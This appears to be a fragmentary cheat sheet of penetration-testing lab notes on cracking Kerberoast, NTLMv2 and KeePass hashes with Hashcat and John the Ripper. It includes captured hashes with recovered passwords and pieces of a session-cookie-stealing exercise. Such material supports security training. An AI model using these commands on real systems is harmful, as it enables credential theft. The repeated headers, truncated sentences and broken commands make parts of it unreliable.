$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$27b5e2726f7c8d87470dc5c768531baf$2a10f36b3ad51260581175e9eb893b7e8b486b10cde5a4900678135297bd5f7fa6d9a455ac69a3996b31d43684c48b496b4de0d41e76aa4b58cfd8638536aebfe5af17994c14e5a86c269a7480862c44cdfb576278b5c544e36fed5fccfdfc0d7f89fed1e32743e64488f2f964e2acfb9348027a9cdf136393de809dbeeddd9c76c7aacb532a6e446dcf216ad4616bb901f11a8470742ff1cd4fcea2884d71feeaa78fad908b5c67525aba50e76a92319e8483befa6b2f4f718e03110c539839173bd6c83ab328267e50c7dbb429b2c51288c72f828bc14d67bc0956589ee8702d314f48ab35656807403e396c5ed2d3414443a9b243a
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - xml
#cat/CRACKING/PASSWORD #cpts
`Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displayin

```
John
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - sql-injection
#cat/CRACKING/PASSWORD #cpts
Although the hash sent to the server by the client doesn't match the one in the database, and the password comparison fails, the SQL injection is still possible using `UNION` queries. Let's consider the following example

```
MariaDB [userdb]> select * from users where username='john'
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-hash-offline
#cat/CRACKING/PASSWORD #cpts
We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access

```
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-hash-offline-2
#cat/CRACKING/PASSWORD #cpts
We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access

```
$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-ntlmv2-hash-with-hashcat
#cat/CRACKING/PASSWORD #cpts
We could then attempt to crack this password hash offline using `Hashcat` to retrieve the cleartext.

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - steal-an-admins-session-cookie-and-gain-access-to-the-support-ticketin
#cat/CRACKING/PASSWORD #cpts
After spawning the target machine, students need to add the entry `STMIP support.inlanefreight.local` into `/etc/hosts` file:

```
sudo sh -c 'echo "STMIP support.inlanefreight.local" >> /etc/hosts'
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - steal-an-admins-session-cookie-and-gain-access-to-the-support-ticketin-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 support.inlanefreight.local" >> /etc/hosts'
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - steal-an-admins-session-cookie-and-gain-access-to-the-support-ticketin-3
#cat/CRACKING/PASSWORD #cpts
Subsequently, students need to create two files on `Pwnbox`/`PMVPN`, "index.php" and "script.js"; the former will log and URL-decode the cookie from the HTTP request (and save it to a file), while the latter will redirec

```
$list = explode(";", $_GET['c'])
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - steal-an-admins-session-cookie-and-gain-access-to-the-support-ticketin-4
#cat/CRACKING/PASSWORD #cpts
Subsequently, students need to create two files on `Pwnbox`/`PMVPN`, "index.php" and "script.js"; the former will log and URL-decode the cookie from the HTTP request (and save it to a file), while the latter will redirec

```
$cookie = urldecode($value)
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - steal-an-admins-session-cookie-and-gain-access-to-the-support-ticketin-5
#cat/CRACKING/PASSWORD #cpts
Students need to make sure to replace `PWNIP` accordingly in the following JavaScript code:

```
javascript
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - steal-an-admins-session-cookie-and-gain-access-to-the-support-ticketin-6
#cat/CRACKING/PASSWORD #cpts
Afterward, students need to start a PHP web server, using the same port number that was specified in the "script.js" file for `PWNPO` (9200 in here):

```
php -S 0.0.0.0:PWNPO
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - perform-a-kerberoasting-attack-and-retrieve-tgs-tickets-for-all-accoun
#cat/CRACKING/PASSWORD #cpts
Once the hashes have been successfully retrieved/saved into a file, students need to use `Hashcat` on them to crack them, supplying 13100 as the hashmode (`Kerberos 5, etype 23, TGS-REP`); students will find out that the

```
hashcat -O -w 3 -m 13100 SPNS /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - perform-a-kerberoasting-attack-and-retrieve-tgs-tickets-for-all-accoun-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -O -w 3 -m 13100 SPNS /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - perform-a-kerberoasting-attack-and-retrieve-tgs-tickets-for-all-accoun-3
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$5709f9d5df41015ca6b894c0a088c057$76673ac703886d3bf8e67fe7c9134de263974f10f4798952f77e8593b0ecb2cc0f4a42fa45637282ca72b18b2bd2ba775ebef46c128bd600cd258a67dfb161a7504d336cd9b22f6b5ce25e9c081cf6a7eb496915c658e1088d73bea69fd9afbd63f788024765a059f5fa7f493cd964bffd589a2834beebd7f16cdd09aa3bee50850dd23420533edf4950b2e6c07792aa87a9d40a156b4a5024f5ea70c1a39dc7a74da3772f1cde32b540f42da2a300c325fccd53650220ff3156d6860d0156489f85076de79b912f3f92832146de7914cab3d2c25cf92cefd957110fccd59c2f6bd5740a8068a90876f67959e6518a0b6d25aabf239f9
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - obtain-the-ntlmv2-password-hash-for-the-mpalledorous-user-and-crack-it
#cat/CRACKING/PASSWORD #cpts
With the hash attained, students now need to copy it over to `Pwnbox`/`PMVPN` and crack it with `Hashcat`, utilizing hashmode 5600; students will find out that the plaintext of the cracked password hash is `1squints2`:

```
hashcat -m 5600 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - obtain-the-ntlmv2-password-hash-for-the-mpalledorous-user-and-crack-it-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 5600 hash -O -w 3 /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the
#cat/CRACKING/PASSWORD #cpts
With the hash attained, students now need to copy it over to `Pwnbox`/`PMVPN` and crack it with `Hashcat`, utilizing hashmode 13100; students will find out that the plaintext of the cracked password hash is `Repeat09`:

```
hashcat -m 13100 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 13100 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-3
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$a8e24991afcbcb96dd7e42cf2cb17721$c14a933e6bb4242468e13116ee6371a9a53149379ad526d796c1b57b41a592873f36013e7ee3d9ebac5d714d867872b10fbe97c073f778223e92b4d25a561de7ef80cd2e3a0fee56b8e3351b4787236d8add28b206aff5b2944ef8225d8b14c14066c2ddae040ec348cedcc36c000b83268effa71cce194ad97b642e7dd4b994d3730633c947b6af80de503b712d69c190acf884166a4d941549d3fde5048a8c7b3b3c8ac621ae97f1070ecbc5faae4df78e9bcf8e2c48dfe8133c547a0b8aaf257f1cd5fc59761589ec1a5ccb164c917d78daef3207464504578eedbcf7f95711be2551875dd27d9792bc989c534af601c1dddeb5797d8
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - hashcat-recommended
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - hashcat-recommended-2
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt --force # if no GPU
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - john-the-ripper-3
#cat/CRACKING/PASSWORD #cpts
```
john --wordlist=/usr/share/wordlists/rockyou.txt captured.hash
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - tombwatcher
#cat/CRACKING/PASSWORD #cpts
extrait du PDF Joplin: tombwatcher

```
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $krb5tgs$2 3 $*Alfred$TOMBWATCHER .HTB $tombwatcher .htb/Alfred* $6 b640d6d48b7a83825 025f081cdcf590f5af6c9...:basketball
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - voleur
#cat/CRACKING/PASSWORD #cpts
extrait du PDF Joplin: voleur

```
office2john Access_Review.xlsx
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - voleur-2
#cat/CRACKING/PASSWORD #cpts
extrait du PDF Joplin: voleur

```
sudo john hash --pot = /tmp/file.txt --wordlist = /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - voleur-3
#cat/CRACKING/PASSWORD #cpts
extrait du PDF Joplin: voleur

```
hashcat whash /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - redelegate
#cat/CRACKING/PASSWORD #cpts
extrait du PDF Joplin: redelegate

```
john --wordlist = pass.txt Shared.kdbx.hash
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - freelancer
#cat/CRACKING/PASSWORD #cpts
extrait du PDF Joplin: freelancer

```
hashcat -a 0 -m 2100.\hash.txt .\pass.txt
```

